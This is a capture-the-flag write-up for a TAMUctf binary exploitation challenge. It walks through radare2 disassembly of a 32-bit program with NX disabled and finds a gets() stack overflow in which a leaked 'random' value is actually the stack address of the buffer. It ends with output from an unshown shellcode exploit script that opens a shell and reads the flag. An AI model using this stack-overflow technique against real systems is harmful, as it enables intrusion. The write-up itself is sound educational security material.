
# pwn3 write-up

remote server found at `nc pwn.ctf.tamu.edu 4323`.

----
The binary output includes a "random" value that looks interesting: `Your random number 0xffcfd99a!`

By examining the binary using radare2 with a small radare2 profile file, see profile.rr2, it is easier to examine automate the stdin from a file called ./stdin.

```bash
vagrant@ctf-tools:~/ctf/tamu18/pwn3$ r2 -e dbg.profile=profile.rr2
```

```python
[0x080483d0]> aaaa
[0x080483d0]> i~arch,canary,nx,pic,relro
arch     x86
canary   false
nx       false
pic      false
relro    partial

[0x080483d0]> ood
Process with PID 4101 started...
File dbg:///home/vagrant/ctf/tamu18/pwn3/pwn3  reopened in read-write mode
= attach 4101 4101
4101

[0xf76fe030]> dcu main
Continue until 0x08048522 using 1 bpsize
hit breakpoint at: 8048522

[0x08048522]> pdf
            ;-- main:
            ;-- eip:
┌ (fcn) sym.main 87
│   sym.main ();
│           ; var int local_4h_2 @ ebp-0x4
│           ; var int local_4h @ esp+0x4
│           ; DATA XREF from 0x080483e7 (entry0)
│           ; DATA XREF from 0x000003e7 (sub.__gmon_start_3c0 + 39)
│           0x08048522      8d4c2404       ecx = [local_4h]            ; 4
│           0x08048526      83e4f0         esp &= 0xfffffff0
│           0x08048529      ff71fc         push dword [ecx - 4]
│           0x0804852c      55             push ebp
│           0x0804852d      89e5           ebp = esp
│           0x0804852f      51             push ecx
│           0x08048530      83ec04         esp -= 4
│           0x08048533      a128a00408     eax = dword sym.stdout      ; obj.stdout ; [0x804a028:4]=0xf7794ac0
│           0x08048538      6a00           push 0
│           0x0804853a      6a00           push 0
│           0x0804853c      6a02           push 2                      ; 2 ; size_t size
│           0x0804853e      50             push eax                    ; int mode
│           0x0804853f      e86cfeffff     sym.imp.setvbuf ()          ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
│           0x08048544      83c410         esp += 0x10
│           0x08048547      83ec0c         esp -= 0xc
│           0x0804854a      6834860408     push str.Welcome_to_the_New_Echo_application_2.0 ; 0x8048634 ; "Welcome to the New Echo application 2.0!" ; const char * s
│           0x0804854f      e83cfeffff     sym.imp.puts ()             ; int puts(const char *s)
│           0x08048554      83c410         esp += 0x10
│           0x08048557      83ec0c         esp -= 0xc
│           0x0804855a      6860860408     push str.Changelog:____Less_deprecated_flag_printing_functions_____New_Random_Number_Generator ; 0x8048660 ; "Changelog:\n- Less deprecated flag printing functions!\n- New Random Number Generator!\n" ; const char * s
│           0x0804855f      e82cfeffff     sym.imp.puts ()             ; int puts(const char *s)
│           0x08048564      83c410         esp += 0x10
│           0x08048567      e85fffffff     sym.echo ()
│           0x0804856c      b800000000     eax = 0
│           0x08048571      8b4dfc         ecx = dword [local_4h_2]
│           0x08048574      c9             leave 
│           0x08048575      8d61fc         esp = [ecx - 4]
└           0x08048578      c3             return
```

Function call at 0x08048567 looks interesting to sym.echo().

```
[0x08048522]> dcu sym.echo
Continue until 0x080484cb using 1 bpsize
Welcome to the New Echo application 2.0!
Changelog:
- Less deprecated flag printing functions!
- New Random Number Generator!

hit breakpoint at: 80484cb

[0x080484cb]> pdf
            ;-- eip:
┌ (fcn) sym.echo 87
│   sym.echo ();
│           ; var int local_eeh @ ebp-0xee
│           ; CALL XREF from 0x08048567 (sym.main)
│           0x080484cb      55             push ebp
│           0x080484cc      89e5           ebp = esp
│           0x080484ce      81ecf8000000   esp -= 0xf8
│           0x080484d4      83ec08         esp -= 8
│           0x080484d7      8d8512ffffff   eax = [local_eeh]
│           0x080484dd      50             push eax
│           0x080484de      6800860408     push str.Your_random_number__p ; 0x8048600 ; "Your random number %p!\n" ; const char * format
│           0x080484e3      e888feffff     sym.imp.printf ()           ; int printf(const char *format)
│           0x080484e8      83c410         esp += 0x10
│           0x080484eb      83ec0c         esp -= 0xc
│           0x080484ee      6818860408     push str.Now_what_should_I_echo ; 0x8048618 ; "Now what should I echo? " ; const char * format
│           0x080484f3      e878feffff     sym.imp.printf ()           ; int printf(const char *format)
│           0x080484f8      83c410         esp += 0x10
│           0x080484fb      83ec0c         esp -= 0xc
│           0x080484fe      8d8512ffffff   eax = [local_eeh]
│           0x08048504      50             push eax                    ; char *s
│           0x08048505      e876feffff     sym.imp.gets ()             ; char*gets(char *s)
│           0x0804850a      83c410         esp += 0x10
│           0x0804850d      83ec0c         esp -= 0xc
│           0x08048510      8d8512ffffff   eax = [local_eeh]
│           0x08048516      50             push eax                    ; const char * s
│           0x08048517      e874feffff     sym.imp.puts ()             ; int puts(const char *s)
│           0x0804851c      83c410         esp += 0x10
│           0x0804851f      90             
│           0x08048520      c9             leave 
└           0x08048521      c3             return

sym.echo() contains a local variable (local_eeh) that is used in gets, shown at 0x080484fe, and later printed using puts, shown at 0x08048517.
The size is 0xee (238).

We rename it to input:
[0x080484cb]> afvn local_eeh input
[0x080484cb]> afvd
var input = 0xffd6fd1a  0x08d60000  ....

[0x080484cb]> pdf
...
│           0x080484d7      8d8512ffffff   eax = [input]
...
│           0x080484fe      8d8512ffffff   eax = [input]
│           0x08048504      50             push eax                    ; char *s
│           0x08048505      e876feffff     sym.imp.gets ()             ; char*gets(char *s)
│           0x0804850a      83c410         esp += 0x10
│           0x0804850d      83ec0c         esp -= 0xc
│           0x08048510      8d8512ffffff   eax = [input]
│           0x08048516      50             push eax                    ; const char * s
│           0x08048517      e874feffff     sym.imp.puts ()             ; int puts(const char *s)
│           0x0804851c      83c410         esp += 0x10
│           0x0804851f      90
│           0x08048520      c9             leave 
└           0x08048521      c3             return
```

I created a pattern of length 300 using  `ragg2 -P 300 -r > stdin` and reopened the binary file.
Now I execute the binary until right after gets, at 0x0804850a.

```python
[0x080484cb]> dcu 0x0804850a
Continue until 0x0804850a using 1 bpsize
Your random number 0xfff27efa!
Now what should I echo? hit breakpoint at: 804850a

[0x080484cb]> afvd
var input = 0xfff27efa  0x42414141  AAAB @eax ascii
```

How nice of them, the "random" number is the address at the stack to the local input variable.
Since the binary do not use NX security mechanisms and the buffer I created the pwnx.py, targeting a shellcode that execute on the stack.

```bash
(ctftools)vagrant@ctf-tools:~/ctf/tamu18/pwn3$ ./pwnx.py 
[*] '/home/vagrant/ctf/tamu18/pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$ ls
flag.txt
pwn3
$ cat flag.txt
gigem{n0w_w3_4r3_g377in6_s74r73d}
```
